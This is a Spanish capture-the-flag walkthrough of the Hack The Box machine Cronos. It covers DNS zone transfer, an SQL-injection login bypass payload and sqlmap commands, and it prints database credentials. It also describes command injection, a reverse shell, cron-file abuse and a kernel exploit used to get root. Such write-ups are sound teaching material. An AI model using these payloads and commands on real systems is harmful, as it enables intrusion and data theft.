# Máquina CRONOS

![](https://i.imgur.com/zBp0A9B.png)

# Reconocimiento

## Nmap

Se realiza un escaneo simple de los puertos abiertos en la máquina:

```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/CRONOS]
└─# nmap -sS --min-rate 5000 -p- 10.10.10.13             
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-21 13:53 -05
Nmap scan report for 10.10.10.13
Host is up (0.10s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.80 seconds
```
Lanzamiento de scripts básicos de reconocimiento y versión:
```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/CRONOS]
└─# nmap -sCV --min-rate 5000 -p22,53,80 10.10.10.13
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-21 13:54 -05
Nmap scan report for 10.10.10.13
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.55 seconds
```

## Puerto 53 - DNS

Para la enumeración de DNS, lo primero que se debe hacer es intentar resolver la IP de Cronos. 

### nslookup
**nslookup** nos permite sacar el nombre de dominio
* Configurar el servidor cronos 10.10.10.13
* Lanzar una consulta DNS

```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/CRONOS]
└─# nslookup                                        
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
```
Se obtiene un dominio potencial **cronos.htb**.

Conocer el dominio ns1.cronos.htb es útil, ya que no solo proporciona un nombre de dominio para buscar, sino que también confirma el dominio base cronos.htb.

Cada vez que hay TCP DNS, vale la pena intentar un **ataque de transferencia de zona** o **axfr** que devuelve un listado de subdominios: 

### dig
```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/CRONOS]
└─# dig axfr cronos.htb @10.10.10.13           

; <<>> DiG 9.17.21-1-Debian <<>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 108 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Fri Jan 21 14:00:51 -05 2022
;; XFR size: 7 records (messages 1, bytes 203)
```

**Para realizar un axfr se necesita conocer de al menos un dominio válido.**

Ahora se añaden estos nuevos subdominios al /etc/hosts para visualizar los distintos recursos que poseen cada uno:

```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/CRONOS]
└─# echo "10.10.10.13 cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb" >> /etc/hosts
```

## Web



### Puerto 80 - admin.cronos.htb

Se obtienen diferentes recursos al ingresar a los otros subdominios pero en este caso solo será de relevancia **admin.cronos.htb**.

Recordar que **Virtual Host Routing** o **Virtual Hosting** es la capacidad que tiene una misma máquina para alojar varios dominios.

![](https://i.imgur.com/80Dj9dH.png)

# Enumeración

## Puerto 80 - welcome.php


Se consigue una fácil intrusión sobre el panel de control introduciendo un payload bastante común para la prueba de SQLi:

```
UserName: cr4y0' or '1'='1'-- -
Password: TextoRandom
```
![](https://i.imgur.com/Sp0Ldi6.png)


## SQLMap

En este caso, SQLMap es de ayuda para recoger mayor información sobre la base de datos.
Se intercepta la petición POST por Burpsuite y se guarda en el archivo **sqli_login**.

Obtención de las bases de datos:
```
sqlmap -r sqli_login —level=5 —risk=3 —dbs
```
![](https://i.imgur.com/mzwWlOk.png)

Obtención de las tablas de la base de datos **admin**:

```
sqlmap -r sqli_login —tables -D 'admin' 
```

![](https://i.imgur.com/tDfbn8M.png)

Obtención de las columnas de la tabla **users** y base de datos **admin**:
```
sqlmap -r sqli_login -p username -D admin -T users --columns
```
![](https://i.imgur.com/TtpINfp.png)

Dumpear los datos de la tabla **users**:
```
sqlmap -r sqli_login —dump -D 'admin' -T users
```
![](https://i.imgur.com/HBGqyG4.png)

La contraseña es: 1327663704 la cual se obtiene de hashes.com.

# Obteniendo Acceso

## Ping - Inyección de comandos


![](https://i.imgur.com/7gQxbJN.png)

## Revershell

Se habilita un puerto en escucha

![](https://i.imgur.com/gfDyMsy.png)

Se injecta un comando para entablar un revershell

![](https://i.imgur.com/53gmY2G.png)

Se obtiene la revershell:

![](https://i.imgur.com/TeFVJwx.png)

## Adicional

El archivo **config.php** contiene credenciales para realizar una conexión a la base de datos **admin**:

```
www-data@cronos:/var/www/admin$ ls
config.php  index.php  logout.php  session.php  welcome.php
www-data@cronos:/var/www/admin$ cat config.php 
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```
Estableciendo conexión a la base de datos:
```
www-data@cronos:/var/www/admin$ mysql -u admin -pkEjdbRigfBHUREiNSDs admin 
```
Algunos comandos para obtener información de la base de datos:

```
//Muestra todas las bases de datos
mysql> select schema_name from information_schema.schemata;
//Muestra la base de datos actual
mysql> select database();
//Muestra las tablas de la base de datos admin
mysql> select table_name from information_schema.tables where table_schema='admin'
//Muestra las columnas de la tabla user de la base de datos admin
mysql> select column_name from information_schema.columns where table_name = 'user' and table_schema = 'admin'
```


Información de la tabla **users**:

![](https://i.imgur.com/NQYU16y.png)



# Escalación de privilegios

## 1era Forma

Se envía el LinEnum a la máquina victima para que brinde un reconocimiento sobre el sistema. Se observa información sobre las tareas cron que se están ejecutando en el sistema, en este caso el usuario **root** está ejecutando el archivo **artisan**.

![](https://i.imgur.com/kIJP6pX.png)

Los permisos que tenemos sobre este archivo son completos **rwx(read, write, exec)**.
```
www-data@cronos:/var/www/laravel$ ls -la | grep "artisan"
-rwxr-xr-x  1 www-data www-data    1260 Jan 22 18:27 artisan
```
Se inyecta código php en el archivo altisan para entablar una revershell:

![](https://i.imgur.com/nbxkwz8.png)



Se obtiene una revershell con privilegios elevados:

![](https://i.imgur.com/GZquRIT.png)

## 2da Forma

Existe una vulnerabilidad de kernel para obtener privilegios elevados **CVE 2017-16995**:

![](https://i.imgur.com/9FhAPEX.png)

Algunos comandos que son de ayuda para obtener mayor información sobre el kernel y sistema:

```
www-data@cronos:/etc$ cat *release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
NAME="Ubuntu"
VERSION="16.04.2 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.2 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

```
www-data@cronos:/etc$ uname -a
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

También se puede usar **Linpeas.sh** que usa **LinuxExploitSuggester** en su escaneo para reportar vulnerabilidades de Kernel.

Compilamos el archivo **exploit_kernel.c** con **gcc**:

```
vi exploit_kernel.c
gcc exploit_kernel.c
```
Y se obtiene el compilado **a.out** el cual se envía a la máquina víctima y se ejecuta:
```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/CRONOS]
└─# file a.out        
a.out: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a047945630df585191eeb35267342bf47f26f8c4, for GNU/Linux 3.2.0, not stripped
```
Se obtiene una shell con privilegios elevados:

![](https://i.imgur.com/7pB9qcZ.png)

En este punto ya se pueden visualizar la flags user.txt y root.txt.

# Recomendaciones u anotaciones:
* Tener en cuenta el ataque **axfr** siempre que se tenga el puerto 53 abierto
* Considerar ambos parámetros existen en el panel login para la prueba de **sqli**.
* Usar **burpsuite** para ver como se tramitan las peticiones.
* Visualizar como primer punto los archivos existentes en **/var/www** si en caso se ha vulnerado alguna web, dado que pueden existir **archivos interesantes(.conf, .config)** con credenciales.
* Tener como segunda prioridad la versión de **kernel y sistema** para escalar privilegios.
* Revisar las tareas **cron** y **archivos asociados** a este.
* El **CVE 2017-16995** junto a un **Ubuntu 16.04.2** permitió escalar privilegios.




# Enlaces:

* Utilidades:

https://www.revshells.com/
https://crackstation.net/
https://hashes.com/en/decrypt/hash

* Writeups que me gustaron y ayudaron a tener un mejor entendimiento:

https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/cronos-writeup-w-o-metasploit

https://medium.com/cronos-htb-walkthough/cronos-htb-walkthrough-9ef91750726

https://medium.com/@delicaterose/htb-cronos-872087d37e21


* Exploit Kernel - CVE: 2017-16995:

https://www.exploit-db.com/exploits/44298
